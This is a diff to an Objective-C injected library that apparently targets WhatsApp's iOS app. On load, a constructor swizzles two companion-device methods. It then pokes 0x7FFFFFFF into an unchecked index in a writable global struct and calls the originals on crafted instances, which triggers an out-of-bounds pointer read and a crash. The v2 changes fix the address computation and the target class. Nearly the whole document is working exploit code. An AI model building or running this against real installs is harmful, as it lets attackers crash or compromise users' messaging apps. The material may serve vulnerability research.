@@ -4,10 +4,16 @@
 //   fetchLinkedAndPendingRemovalCompanionDevicesForAccountUserJID:currentDeviceList:
 //       @0x101CA1634 (unchecked idx @ 0x101CA1684: ldrsw x8,[x8,#0x10] -> ldr x26,[x20,x8])
 // Both read the SAME shared 3-word index struct (thunk 0x1000242A4 -> &0x107d0744c,
-// __DATA writable; idx0@+0, idx1@+4, UNCHECKED idx2@+0x10) — same t7 bug class.
+// __DATA __objc_ivar, writable; idx0@+0, idx1@+4, UNCHECKED idx2@+0x10) — same t7 bug class.
 // Drive: write 0x7FFFFFFF into struct+0x10 (slide-adjusted), call orig on crafted
 // instance -> table[0x7FFFFFFF] -> garbage pointer -> downstream SIGSEGV.
-// Reuses ME73 lessons: FAST constructor, inline drive on main thread, marker-only logging.
+//
+// v2 FIXES:
+//   * struct runtime addr = 0x100000000 + slide + 0x7d0744c  (was missing image base!)
+//   * BOTH selectors swizzled on WAOwnDeviceStorageManagerMain (classmap: same class
+//     hosts all 4 family sites; WAOwnDeviceManagerMain was a wrong guess)
+//   * re-swizzle guard: never re-swizzle an already-hooked selector (prevents
+//     clobbering orig with our own hook on retry attempts)
 
 #import <Foundation/Foundation.h>
 #import <objc/runtime.h>
@@ -32,23 +38,22 @@ static void wa_marker(NSString *msg) {
     } @catch (NSException *e) {}
 }
 
-// --- shared global index struct (image-relative) ---
-static const uint64_t kIndexStructRel = 0x7d0744c; // 0x107d0744c - 0x100000000
+// --- shared global index struct: vmaddr 0x107d0744c, image base 0x100000000 ---
+static const uint64_t kIndexStructVMA = 0x107d0744cULL;
+static const uint64_t kImgBase       = 0x100000000ULL;
 
 static void *g_struct_slide(void) {
     uintptr_t slide = _dyld_get_image_vmaddr_slide(0); // main executable
-    return (void *)(slide + kIndexStructRel);
+    return (void *)(kImgBase + slide + (kIndexStructVMA - kImgBase));
 }
 
-// --- hooks: signatures ---
-// fetchPendingRemovalCompanionDevicesForAccountUserJID:(id)jid
+// --- hooks ---
 static void (*orig_fetchPending)(id, SEL, id);
 static void hook_fetchPending(id self, SEL _cmd, id jid) {
     wa_marker([NSString stringWithFormat:@"[hook] fetchPendingRemoval... jid=%@ self=%@", jid, NSStringFromClass([self class])]);
     orig_fetchPending(self, _cmd, jid);
 }
 
-// fetchLinkedAndPendingRemovalCompanionDevicesForAccountUserJID:(id)jid currentDeviceList:(id)list
 static void (*orig_fetchLinked)(id, SEL, id, id);
 static void hook_fetchLinked(id self, SEL _cmd, id jid, id list) {
     wa_marker([NSString stringWithFormat:@"[hook] fetchLinkedAndPending... jid=%@ list=%@ self=%@", jid, list, NSStringFromClass([self class])]);
@@ -58,6 +63,7 @@ static void hook_fetchLinked(id self, SEL _cmd, id jid, id list) {
 static int g_hooked = 0;
 
 static void wa_swizzle(Class cls, SEL sel, IMP newImp, void **origOut) {
+    if (*origOut) return; // already hooked — do NOT clobber
     Method m = class_getInstanceMethod(cls, sel);
     if (!m) {
         wa_marker([NSString stringWithFormat:@"[swz] MISSING %@ %@", NSStringFromClass(cls), NSStringFromSelector(sel)]);
@@ -68,7 +74,6 @@ static void wa_swizzle(Class cls, SEL sel, IMP newImp, void **origOut) {
     wa_marker([NSString stringWithFormat:@"[swz] hooked %@ %@ (orig=%p)", NSStringFromClass(cls), NSStringFromSelector(sel), old]);
 }
 
-// find class that actually implements the selector (runtime scan, no static PAC issues)
 static Class wa_find_class(SEL sel) {
     unsigned int count = 0;
     Class *list = objc_copyClassList(&count);
@@ -84,7 +89,6 @@ static Class wa_find_class(SEL sel) {
 static void run_drive_inline(void) {
     wa_marker(@"[drive] t8 drive start (struct idx2 = 0x7FFFFFFF)");
 
-    // 1. locate shared index struct, poke idx2
     int32_t *st = (int32_t *)g_struct_slide();
     if (!st) { wa_marker(@"[drive] struct NULL — abort"); return; }
     wa_marker([NSString stringWithFormat:@"[drive] struct @%p before: [+0]=%d [+4]=%d [+0x10]=%d", st, st[0], st[1], st[4]]);
@@ -94,12 +98,11 @@ static void run_drive_inline(void) {
     SEL s1 = NSSelectorFromString(@"fetchPendingRemovalCompanionDevicesForAccountUserJID:");
     SEL s2 = NSSelectorFromString(@"fetchLinkedAndPendingRemovalCompanionDevicesForAccountUserJID:currentDeviceList:");
     Class c1 = NSClassFromString(@"WAOwnDeviceStorageManagerMain");
-    Class c2 = NSClassFromString(@"WAOwnDeviceManagerMain");
+    Class c2 = NSClassFromString(@"WAOwnDeviceStorageManagerMain");
     if (!c1) c1 = wa_find_class(s1);
     if (!c2) c2 = wa_find_class(s2);
     wa_marker([NSString stringWithFormat:@"[drive] class1=%@ class2=%@", c1 ? NSStringFromClass(c1) : @"?", c2 ? NSStringFromClass(c2) : @"?"]);
 
-    // 2. drive method 1
     if (orig_fetchPending && c1) {
         __unsafe_unretained id selfObj = class_createInstance(c1, 0);
         wa_marker(@"[drive] calling fetchPendingRemoval... (crafted instance)");
@@ -109,7 +112,6 @@ static void run_drive_inline(void) {
         wa_marker([NSString stringWithFormat:@"[drive] SKIP method1 (orig=%p c1=%p)", orig_fetchPending, c1]);
     }
 
-    // 3. drive method 2
     if (orig_fetchLinked && c2) {
         __unsafe_unretained id selfObj = class_createInstance(c2, 0);
         wa_marker(@"[drive] calling fetchLinkedAndPendingRemoval... (crafted instance)");
@@ -125,29 +127,26 @@ static void run_drive_inline(void) {
 __attribute__((constructor))
 static void waInit(void) {
     @autoreleasepool {
-        wa_marker(@"=== waContainerFix ME73b (t8 companion-device family) constructor ===");
+        wa_marker(@"=== waContainerFix ME73b v2 (t8 companion-device family) constructor ===");
 
-        for (int attempt = 0; attempt < 4; attempt++) {
-            if (!g_hooked) {
-                SEL s1 = NSSelectorFromString(@"fetchPendingRemovalCompanionDevicesForAccountUserJID:");
-                SEL s2 = NSSelectorFromString(@"fetchLinkedAndPendingRemovalCompanionDevicesForAccountUserJID:currentDeviceList:");
-                Class c1 = NSClassFromString(@"WAOwnDeviceStorageManagerMain");
-                Class c2 = NSClassFromString(@"WAOwnDeviceManagerMain");
-                if (!c1) c1 = wa_find_class(s1);
-                if (!c2) c2 = wa_find_class(s2);
-                int done = 0;
-                if (c1) {
-                    wa_swizzle(c1, s1, (IMP)hook_fetchPending, (void **)&orig_fetchPending);
-                    if (orig_fetchPending) done++;
-                } else wa_marker(@"[init] class1 not loaded yet");
-                if (c2) {
-                    wa_swizzle(c2, s2, (IMP)hook_fetchLinked, (void **)&orig_fetchLinked);
-                    if (orig_fetchLinked) done++;
-                } else wa_marker(@"[init] class2 not loaded yet");
-                if (done == 2) g_hooked = 1;
-            }
-            wa_marker([NSString stringWithFormat:@"[init] attempt %d: hooked=%d", attempt + 1, g_hooked]);
-            if (g_hooked) break;
+        SEL s1 = NSSelectorFromString(@"fetchPendingRemovalCompanionDevicesForAccountUserJID:");
+        SEL s2 = NSSelectorFromString(@"fetchLinkedAndPendingRemovalCompanionDevicesForAccountUserJID:currentDeviceList:");
+        for (int attempt = 0; attempt < 4 && !g_hooked; attempt++) {
+            Class c1 = NSClassFromString(@"WAOwnDeviceStorageManagerMain");
+            Class c2 = NSClassFromString(@"WAOwnDeviceStorageManagerMain");
+            if (!c1) c1 = wa_find_class(s1);
+            if (!c2) c2 = wa_find_class(s2);
+            int done = 0;
+            if (c1) {
+                wa_swizzle(c1, s1, (IMP)hook_fetchPending, (void **)&orig_fetchPending);
+                if (orig_fetchPending) done++;
+            } else wa_marker(@"[init] class1 not loaded yet");
+            if (c2) {
+                wa_swizzle(c2, s2, (IMP)hook_fetchLinked, (void **)&orig_fetchLinked);
+                if (orig_fetchLinked) done++;
+            } else wa_marker(@"[init] class2 not loaded yet");
+            wa_marker([NSString stringWithFormat:@"[init] attempt %d: hooked=%d", attempt + 1, done]);
+            if (done == 2) { g_hooked = 1; break; }
             usleep(250000);
         }
         wa_marker(@"[init] ME73b constructor complete");
